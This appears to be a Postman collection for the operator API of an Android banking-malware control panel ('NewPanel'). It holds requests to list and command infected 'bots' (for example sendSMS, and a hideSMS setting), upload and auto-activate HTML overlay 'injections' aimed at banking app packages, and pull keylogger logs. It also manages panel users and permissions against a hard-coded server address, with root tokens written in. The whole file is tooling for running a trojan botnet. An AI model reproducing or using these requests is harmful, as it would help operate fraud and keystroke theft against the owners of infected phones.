@@ -1,0 +1,1666 @@
+{
+	"info": {
+		"_postman_id": "274c2ad6-8d86-4f47-9ff2-32a6f594841a",
+		"name": "NewPanel",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "auth",
+			"item": [
+				{
+					"name": "register",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"var jsonData = JSON.parse(responseBody);\r",
+									"pm.collectionVariables.set(\"token\", jsonData.payload.token);\r",
+									""
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"token\": \"4d55554635555356544344645\",\r\n    \"name\": \"root452\",\r\n    \"email\": \"root3@email.com\",\r\n    \"expired_at\": null,\r\n    \"tags\": [],\r\n    \"role\": \"root\"\r\n}"
+						},
+						"url": {
+							"raw": "http://newpanel/api/register",
+							"protocol": "http",
+							"host": [
+								"newpanel"
+							],
+							"path": [
+								"api",
+								"register"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "login",
+					"event": [
+						{
+							"listen": "prerequest",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript"
+							}
+						},
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"var jsonData = JSON.parse(responseBody);\r",
+									"pm.collectionVariables.set(\"token\", jsonData.payload.token);\r",
+									""
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "token",
+									"value": "root",
+									"type": "text"
+								},
+								{
+									"key": "password",
+									"value": "root",
+									"type": "text"
+								},
+								{
+									"key": "Authorization:",
+									"value": "",
+									"type": "text",
+									"disabled": true
+								}
+							]
+						},
+						"url": {
+							"raw": "{{host}}/api/login",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"login"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "me",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "username",
+									"value": "user",
+									"type": "text",
+									"disabled": true
+								},
+								{
+									"key": "password",
+									"value": "password",
+									"type": "text",
+									"disabled": true
+								}
+							]
+						},
+						"url": {
+							"raw": "{{host}}/api/me",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"me"
+							]
+						}
+					},
+					"response": []
+				}
+			],
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"type": "text/javascript",
+						"exec": [
+							""
+						]
+					}
+				},
+				{
+					"listen": "test",
+					"script": {
+						"type": "text/javascript",
+						"exec": [
+							""
+						]
+					}
+				}
+			]
+		},
+		{
+			"name": "bots",
+			"item": [
+				{
+					"name": "{bot}",
+					"item": [
+						{
+							"name": "commands",
+							"item": [
+								{
+									"name": "list",
+									"protocolProfileBehavior": {
+										"disableBodyPruning": true
+									},
+									"request": {
+										"method": "GET",
+										"header": [
+											{
+												"key": "Content-Type",
+												"value": "application/json",
+												"type": "text"
+											},
+											{
+												"key": "",
+												"value": "",
+												"type": "text",
+												"disabled": true
+											},
+											{
+												"key": "Accept",
+												"value": "application/json",
+												"type": "text"
+											}
+										],
+										"body": {
+											"mode": "raw",
+											"raw": "{\r\n    \"per_page\": 5,\r\n    \"page\": 1\r\n}"
+										},
+										"url": {
+											"raw": "{{host}}/api/bots/{{botId}}/commands/list",
+											"host": [
+												"{{host}}"
+											],
+											"path": [
+												"api",
+												"bots",
+												"{{botId}}",
+												"commands",
+												"list"
+											]
+										}
+									},
+									"response": []
+								}
+							]
+						},
+						{
+							"name": "settings",
+							"item": [
+								{
+									"name": "update",
+									"request": {
+										"method": "PUT",
+										"header": [
+											{
+												"key": "Content-Type",
+												"value": "application/json",
+												"type": "text"
+											},
+											{
+												"key": "",
+												"value": "",
+												"type": "text",
+												"disabled": true
+											},
+											{
+												"key": "Accept",
+												"value": "application/json",
+												"type": "text"
+											}
+										],
+										"body": {
+											"mode": "raw",
+											"raw": "{\r\n    \"type\": \"hideSMS\",\r\n    \"value\": true\r\n}"
+										},
+										"url": {
+											"raw": "{{host}}/api/bots/{{botId}}/settings/update",
+											"host": [
+												"{{host}}"
+											],
+											"path": [
+												"api",
+												"bots",
+												"{{botId}}",
+												"settings",
+												"update"
+											]
+										}
+									},
+									"response": []
+								}
+							]
+						},
+						{
+							"name": "injections",
+							"item": [
+								{
+									"name": "update",
+									"request": {
+										"method": "PUT",
+										"header": [
+											{
+												"key": "Content-Type",
+												"value": "application/json",
+												"type": "text"
+											},
+											{
+												"key": "",
+												"value": "",
+												"type": "text",
+												"disabled": true
+											},
+											{
+												"key": "Accept",
+												"value": "application/json",
+												"type": "text"
+											}
+										],
+										"body": {
+											"mode": "raw",
+											"raw": "{\r\n    \"application\": \"com.finanteq.finance.ca\",\r\n    \"is_active\": true\r\n}"
+										},
+										"url": {
+											"raw": "{{host}}/api/bots/{{botId}}/injections/update",
+											"host": [
+												"{{host}}"
+											],
+											"path": [
+												"api",
+												"bots",
+												"{{botId}}",
+												"injections",
+												"update"
+											]
+										}
+									},
+									"response": []
+								}
+							]
+						},
+						{
+							"name": "setType",
+							"request": {
+								"method": "PUT",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json",
+										"type": "text"
+									},
+									{
+										"key": "",
+										"value": "",
+										"type": "text",
+										"disabled": true
+									},
+									{
+										"key": "Accept",
+										"value": "application/json",
+										"type": "text"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\r\n    \"type\": \"favorite\",\r\n    \"value\": true\r\n}"
+								},
+								"url": {
+									"raw": "{{host}}/api/bots/{{botId}}/setType",
+									"host": [
+										"{{host}}"
+									],
+									"path": [
+										"api",
+										"bots",
+										"{{botId}}",
+										"setType"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "delete",
+							"request": {
+								"method": "DELETE",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json",
+										"type": "text"
+									},
+									{
+										"key": "",
+										"value": "",
+										"type": "text",
+										"disabled": true
+									},
+									{
+										"key": "Accept",
+										"value": "application/json",
+										"type": "text"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": ""
+								},
+								"url": {
+									"raw": "{{host}}/api/bots/{{botId}}",
+									"host": [
+										"{{host}}"
+									],
+									"path": [
+										"api",
+										"bots",
+										"{{botId}}"
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "list",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"var jsonData = JSON.parse(responseBody);\r",
+									"pm.collectionVariables.set(\"botId\", jsonData.payload[0].id);\r",
+									""
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"protocolProfileBehavior": {
+						"disabledSystemHeaders": {
+							"content-type": true,
+							"accept": true
+						}
+					},
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "X-Requested-With",
+								"value": "XMLHttpRequest",
+								"type": "text",
+								"disabled": true
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n  \"page\": 1,\r\n  \"filters\": {\r\n    \"countries\": [],\r\n    \"injections\": [],\r\n    \"statuses\": [],\r\n    \"types\": []\r\n  },\r\n  \"limit\": 12\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/bots/list",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"bots",
+								"list"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "filters",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": ""
+						},
+						"url": {
+							"raw": "{{host}}/api/bots/filters",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"bots",
+								"filters"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "updateLastConnections",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{host}}/api/bots/updateLastConnections",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"bots",
+								"updateLastConnections"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "sendCommand",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"command\": \"sendSMS\",\r\n    \"payload\": {\r\n        \"sim1\": true\r\n    },\r\n    \"botIds\": [\r\n        \"a02f351d-23fe-4ab2-b6ef-c96e60170e83\"\r\n    ]\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/bots/sendCommand",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"bots",
+								"sendCommand"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "delete",
+					"request": {
+						"method": "DELETE",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"botIds\": [\r\n        \"v3m0k37vmusvg9a1q\"\r\n    ]\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/bots/delete",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"bots",
+								"delete"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "deleteAllRemovedApp",
+					"request": {
+						"method": "DELETE",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": ""
+						},
+						"url": {
+							"raw": "{{host}}/api/bots/deleteAllRemovedApp",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"bots",
+								"deleteAllRemovedApp"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "editComment",
+					"request": {
+						"method": "PUT",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"comment\": \"<b>kekw3</b>\",\r\n    \"botIds\": [\"{{botId}}\"]\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/bots/editComment",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"bots",
+								"editComment"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "logs",
+			"item": [
+				{
+					"name": "list",
+					"event": [
+						{
+							"listen": "prerequest",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript"
+							}
+						},
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"var jsonData = JSON.parse(responseBody);\r",
+									"pm.collectionVariables.set(\"logId\", jsonData.payload[0].id);\r",
+									""
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"page\": 6,\r\n    \"per_page\": 2,\r\n    \"type\": \"datakeylogger\",\r\n    \"keyloggerAction\" : \"[Click]\",\r\n    \"filters\": {\r\n        \"application\": \"\",\r\n        \"query\": \"\"\r\n    },\r\n    \"sort\": {\r\n        \"field\": \"bot_id\",\r\n        \"by\": \"descend\"\r\n    }\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/logs/list",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"logs",
+								"list"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "datakeylogger [Click]",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"page\": 1,\r\n    \"per_page\": 12,\r\n    \"type\": \"datakeylogger\",\r\n    \"keyloggerAction\": \"[Click]\"\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/logs/list",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"logs",
+								"list"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "datakeylogger [KeyLog]",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"page\": 1,\r\n    \"per_page\": 12,\r\n    \"type\": \"datakeylogger\",\r\n    \"keyloggerAction\": \"[KeyLog]\"\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/logs/list",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"logs",
+								"list"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "datakeylogger [Write Text]",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"page\": 1,\r\n    \"per_page\": 12,\r\n    \"type\": \"datakeylogger\",\r\n    \"keyloggerAction\": \"[Write Text]\"\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/logs/list",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"logs",
+								"list"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "datakeylogger [Focused]",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"page\": 1,\r\n    \"per_page\": 12,\r\n    \"type\": \"datakeylogger\",\r\n    \"keyloggerAction\": \"[Focused]\"\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/logs/list",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"logs",
+								"list"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "datakeylogger [Selected]",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"page\": 1,\r\n    \"per_page\": 12,\r\n    \"type\": \"datakeylogger\",\r\n    \"keyloggerAction\": \"[Selected]\"\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/logs/list",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"logs",
+								"list"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "delete",
+					"request": {
+						"method": "DELETE",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"logIds\": [469]\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/logs/delete",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"logs",
+								"delete"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "editComment",
+					"request": {
+						"method": "PUT",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"logIds\": [484, 468],\r\n    \"comment\": \"sdfsdf\"\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/logs/editComment",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"logs",
+								"editComment"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "injections",
+			"item": [
+				{
+					"name": "list",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n  \"page\": 1,\r\n  \"per_page\": 4,\r\n  \"filters\": {\r\n    \"autoInject\": false,\r\n    \"type\": \"crypt\",\r\n    \"query\": \"com.\"\r\n  }\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/injections/list",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"injections",
+								"list"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "create",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "formdata",
+							"formdata": [
+								{
+									"key": "html",
+									"type": "file",
+									"src": "/C:/Users/PC for education/Desktop/pallete.html"
+								},
+								{
+									"key": "image",
+									"type": "file",
+									"src": "/C:/Users/PC for education/Desktop/image (1).png"
+								},
+								{
+									"key": "name",
+									"value": "COM>TEST",
+									"type": "text"
+								},
+								{
+									"key": "application",
+									"value": "com.test",
+									"type": "text"
+								},
+								{
+									"key": "type",
+									"value": "banks",
+									"type": "text"
+								}
+							]
+						},
+						"url": {
+							"raw": "{{host}}/api/injections/create",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"injections",
+								"create"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "edit",
+					"protocolProfileBehavior": {
+						"disabledSystemHeaders": {}
+					},
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"warning": "This is a duplicate header and will be overridden by the Content-Type header generated by Postman.",
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "formdata",
+							"formdata": [
+								{
+									"key": "html",
+									"type": "file",
+									"src": "/C:/Users/PC for education/Desktop/pallete.html"
+								},
+								{
+									"key": "image",
+									"type": "file",
+									"src": "/C:/Users/PC for education/Desktop/image (1).png"
+								},
+								{
+									"key": "name",
+									"value": "Minecraft3",
+									"type": "text"
+								},
+								{
+									"key": "application",
+									"value": "com.test234",
+									"type": "text"
+								},
+								{
+									"key": "type",
+									"value": "banks",
+									"type": "text"
+								}
+							]
+						},
+						"url": {
+							"raw": "{{host}}/api/injections/450/edit",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"injections",
+								"450",
+								"edit"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "updateAutoInject",
+					"protocolProfileBehavior": {
+						"disabledSystemHeaders": {}
+					},
+					"request": {
+						"method": "PUT",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"autoInject\": true\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/injections/465/changeAutoInject",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"injections",
+								"465",
+								"changeAutoInject"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "delete",
+					"request": {
+						"method": "DELETE",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n  \"ids\": [450, 451]\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/injections/delete",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"injections",
+								"delete"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "users",
+			"item": [
+				{
+					"name": "list",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"page\": 1,\r\n    \"per_page\": 4\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/users/list",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"users",
+								"list"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "edit",
+					"request": {
+						"method": "PUT",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"token\": \"roo3t\",\r\n    \"name\": \"root2\",\r\n    \"email\": \"root3@email.com\",\r\n    \"is_paused\": true,\r\n    \"expired_at\": \"2021-12-31 00:00:00\",\r\n    \"tags\": [],\r\n    \"role\": \"root\"\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/users/1/edit",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"users",
+								"1",
+								"edit"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "delete",
+					"request": {
+						"method": "DELETE",
+						"header": [],
+						"url": {
+							"raw": "{{host}}/api/users/4/delete",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"users",
+								"4",
+								"delete"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "create",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"token\": \"4d5555655553654645\",\r\n    \"name\": \"root452\",\r\n    \"email\": \"root3@email.com\",\r\n    \"expired_at\": null,\r\n    \"tags\": [],\r\n    \"role\": \"root\"\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/users/create",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"users",
+								"create"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "permissions",
+			"item": [
+				{
+					"name": "list",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"page\": 1,\r\n    \"per_page\": 4\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/permissions/list",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"permissions",
+								"list"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "update",
+					"request": {
+						"method": "PUT",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "",
+								"value": "",
+								"type": "text",
+								"disabled": true
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"roles\": [\"root\", \"admin\"],\r\n    \"permission\": \"permissions.change\"\r\n}"
+						},
+						"url": {
+							"raw": "{{host}}/api/permissions/update",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"permissions",
+								"update"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "counts",
+			"item": [
+				{
+					"name": "list",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": ""
+						},
+						"url": {
+							"raw": "{{host}}/api/counts/list",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"counts",
+								"list"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "stats",
+			"item": [
+				{
+					"name": "list",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "text"
+							},
+							{
+								"key": "Accept",
+								"value": "application/json",
+								"type": "text"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": ""
+						},
+						"url": {
+							"raw": "{{host}}/api/stats/list",
+							"host": [
+								"{{host}}"
+							],
+							"path": [
+								"api",
+								"stats",
+								"list"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		}
+	],
+	"auth": {
+		"type": "bearer",
+		"bearer": [
+			{
+				"key": "token",
+				"value": "{{token}}",
+				"type": "string"
+			}
+		]
+	},
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "host",
+			"value": "http://5.188.33.192:8081"
+		},
+		{
+			"key": "token",
+			"value": ""
+		},
+		{
+			"key": "botId",
+			"value": "a02f351d-23fe-4ab2-b6ef-c96e60170e83"
+		},
+		{
+			"key": "logId",
+			"value": "1"
+		}
+	]
+}
